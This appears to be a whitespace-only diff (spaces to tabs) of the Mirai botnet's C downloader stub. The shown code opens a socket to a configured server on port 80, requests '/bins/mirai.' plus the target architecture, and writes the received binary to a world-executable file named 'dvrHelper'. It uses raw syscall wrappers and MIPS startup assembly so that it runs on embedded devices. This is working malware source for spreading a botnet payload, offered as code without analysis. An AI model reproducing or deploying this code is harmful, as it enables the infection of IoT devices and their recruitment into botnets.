@@ -23,9 +23,9 @@
 #elif BYTE_ORDER == LITTLE_ENDIAN
 #define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
 #define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \
-                  ((((unsigned long)(n) & 0xff00)) << 8) | \
-                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
-                  ((((unsigned long)(n) & 0xff000000)) >> 24))
+				  ((((unsigned long)(n) & 0xff00)) << 8) | \
+				  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
+				  ((((unsigned long)(n) & 0xff000000)) >> 24))
 #else
 #error "Fix byteorder"
 #endif
@@ -61,214 +61,214 @@ void x__exit(int);
 /*
 void xprintf(char *str)
 {
-    write(1, str, sstrlen(str));
+	write(1, str, sstrlen(str));
 }
 #define printf xprintf
 */
 #endif
 
 void __start(void)
-{ 
+{
 #if defined(MIPS) || defined(MIPSEL)
-    __asm(
-        ".set noreorder\n"
-        "move $0, $31\n"
-        "bal 10f\n"
-        "nop\n"
-        "10:\n.cpload $31\n"
-        "move $31, $0\n"
-        ".set reorder\n"
-    );
+	__asm(
+		".set noreorder\n"
+		"move $0, $31\n"
+		"bal 10f\n"
+		"nop\n"
+		"10:\n.cpload $31\n"
+		"move $31, $0\n"
+		".set reorder\n"
+	);
 #endif
-    run();
+	run();
 }
 
 inline void run(void)
 {
-    char recvbuf[128];
-    struct sockaddr_in addr;
-    int sfd, ffd, ret;
-    unsigned int header_parser = 0;
-    int arch_strlen = sstrlen(BOT_ARCH);
+	char recvbuf[128];
+	struct sockaddr_in addr;
+	int sfd, ffd, ret;
+	unsigned int header_parser = 0;
+	int arch_strlen = sstrlen(BOT_ARCH);
 
-    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);
+	write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);
 
-    addr.sin_family = AF_INET;
-    addr.sin_port = HTONS(80);
-    addr.sin_addr.s_addr = HTTP_SERVER;
+	addr.sin_family = AF_INET;
+	addr.sin_port = HTONS(80);
+	addr.sin_addr.s_addr = HTTP_SERVER;
 
-    ffd = open("dvrHelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);
+	ffd = open("dvrHelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);
 
-    sfd = socket(AF_INET, SOCK_STREAM, 0);
-
-#ifdef DEBUG
-    if (ffd == -1)
-        printf("Failed to open file!\n");
-    if (sfd == -1)
-        printf("Failed to call socket()\n");
-#endif
-
-    if (sfd == -1 || ffd == -1)
-        __exit(1);
+	sfd = socket(AF_INET, SOCK_STREAM, 0);
 
 #ifdef DEBUG
-    printf("Connecting to host...\n");
+	if (ffd == -1)
+		printf("Failed to open file!\n");
+	if (sfd == -1)
+		printf("Failed to call socket()\n");
 #endif
 
-    if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0)
-    {
-#ifdef DEBUG
-        printf("Failed to connect to host.\n");
-#endif
-        write(STDOUT, "NIF\n", 4);
-        __exit(-ret);
-    }
+	if (sfd == -1 || ffd == -1)
+		__exit(1);
 
 #ifdef DEBUG
-    printf("Connected to host\n");
+	printf("Connecting to host...\n");
 #endif
 
-    if (write(sfd, "GET /bins/mirai." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
-    {
+	if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0)
+	{
 #ifdef DEBUG
-        printf("Failed to send get request.\n");
+		printf("Failed to connect to host.\n");
 #endif
-
-        __exit(3);
-    }
-
-#ifdef DEBUG
-    printf("Started header parse...\n");
-#endif
-
-    while (header_parser != 0x0d0a0d0a)
-    {
-        char ch;
-        int ret = read(sfd, &ch, 1);
-
-        if (ret != 1)
-            __exit(4);
-        header_parser = (header_parser << 8) | ch;
-    }
+		write(STDOUT, "NIF\n", 4);
+		__exit(-ret);
+	}
 
 #ifdef DEBUG
-    printf("Finished receiving HTTP header\n");
+	printf("Connected to host\n");
 #endif
 
-    while (1)
-    {
-        int ret = read(sfd, recvbuf, sizeof (recvbuf));
+	if (write(sfd, "GET /bins/mirai." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
+	{
+#ifdef DEBUG
+		printf("Failed to send get request.\n");
+#endif
 
-        if (ret <= 0)
-            break;
-        write(ffd, recvbuf, ret);
-    }
+		__exit(3);
+	}
 
-    close(sfd);
-    close(ffd);
-    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
-    __exit(5);
+#ifdef DEBUG
+	printf("Started header parse...\n");
+#endif
+
+	while (header_parser != 0x0d0a0d0a)
+	{
+		char ch;
+		int ret = read(sfd, &ch, 1);
+
+		if (ret != 1)
+			__exit(4);
+		header_parser = (header_parser << 8) | ch;
+	}
+
+#ifdef DEBUG
+	printf("Finished receiving HTTP header\n");
+#endif
+
+	while (1)
+	{
+		int ret = read(sfd, recvbuf, sizeof (recvbuf));
+
+		if (ret <= 0)
+			break;
+		write(ffd, recvbuf, ret);
+	}
+
+	close(sfd);
+	close(ffd);
+	write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
+	__exit(5);
 }
 
 int sstrlen(char *str)
 {
-    int c = 0;
+	int c = 0;
 
-    while (*str++ != 0)
-        c++;
-    return c;
+	while (*str++ != 0)
+		c++;
+	return c;
 }
 
 unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char three, unsigned char four)
 {
-    unsigned long ip = 0;
+	unsigned long ip = 0;
 
-    ip |= (one << 24);
-    ip |= (two << 16);
-    ip |= (three << 8);
-    ip |= (four << 0);
-    return HTONL(ip);
+	ip |= (one << 24);
+	ip |= (two << 16);
+	ip |= (three << 8);
+	ip |= (four << 0);
+	return HTONL(ip);
 }
 
 int xsocket(int domain, int type, int protocol)
 {
 #if defined(__NR_socketcall)
 #ifdef DEBUG
-    printf("socket using socketcall\n");
+	printf("socket using socketcall\n");
 #endif
-    struct {
-        int domain, type, protocol;
-    } socketcall;
-    socketcall.domain = domain;
-    socketcall.type = type;
-    socketcall.protocol = protocol;
+	struct {
+		int domain, type, protocol;
+	} socketcall;
+	socketcall.domain = domain;
+	socketcall.type = type;
+	socketcall.protocol = protocol;
 
-    // 1 == SYS_SOCKET
-    int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);
+	// 1 == SYS_SOCKET
+	int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);
 
 #ifdef DEBUG
-    printf("socket got ret: %d\n", ret);
+	printf("socket got ret: %d\n", ret);
 #endif
-     return ret;
+	 return ret;
 #else
 #ifdef DEBUG
-    printf("socket using socket\n");
+	printf("socket using socket\n");
 #endif
-    return syscall(SCN(SYS_socket), domain, type, protocol);
+	return syscall(SCN(SYS_socket), domain, type, protocol);
 #endif
 }
 
 int xread(int fd, void *buf, int len)
 {
-    return syscall(SCN(SYS_read), fd, buf, len);
+	return syscall(SCN(SYS_read), fd, buf, len);
 }
 
 int xwrite(int fd, void *buf, int len)
 {
-    return syscall(SCN(SYS_write), fd, buf, len);
+	return syscall(SCN(SYS_write), fd, buf, len);
 }
 
 int xconnect(int fd, struct sockaddr_in *addr, int len)
 {
 #if defined(__NR_socketcall)
 #ifdef DEBUG
-    printf("connect using socketcall\n");
+	printf("connect using socketcall\n");
 #endif
-    struct {
-        int fd;
-        struct sockaddr_in *addr;
-        int len;
-    } socketcall;
-    socketcall.fd = fd;
-    socketcall.addr = addr;
-    socketcall.len = len;
-    // 3 == SYS_CONNECT
-    int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);
+	struct {
+		int fd;
+		struct sockaddr_in *addr;
+		int len;
+	} socketcall;
+	socketcall.fd = fd;
+	socketcall.addr = addr;
+	socketcall.len = len;
+	// 3 == SYS_CONNECT
+	int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);
 
 #ifdef DEBUG
-    printf("connect got ret: %d\n", ret);
+	printf("connect got ret: %d\n", ret);
 #endif
 
-    return ret;
+	return ret;
 #else
 #ifdef DEBUG
-    printf("connect using connect\n");
+	printf("connect using connect\n");
 #endif
-    return syscall(SCN(SYS_connect), fd, addr, len);
+	return syscall(SCN(SYS_connect), fd, addr, len);
 #endif
 }
 
 int xopen(char *path, int flags, int other)
 {
-    return syscall(SCN(SYS_open), path, flags, other);
+	return syscall(SCN(SYS_open), path, flags, other);
 }
 
 int xclose(int fd)
 {
-    return syscall(SCN(SYS_close), fd);
+	return syscall(SCN(SYS_close), fd);
 }
 
 void x__exit(int code)
 {
-    syscall(SCN(SYS_exit), code);
+	syscall(SCN(SYS_exit), code);
 }
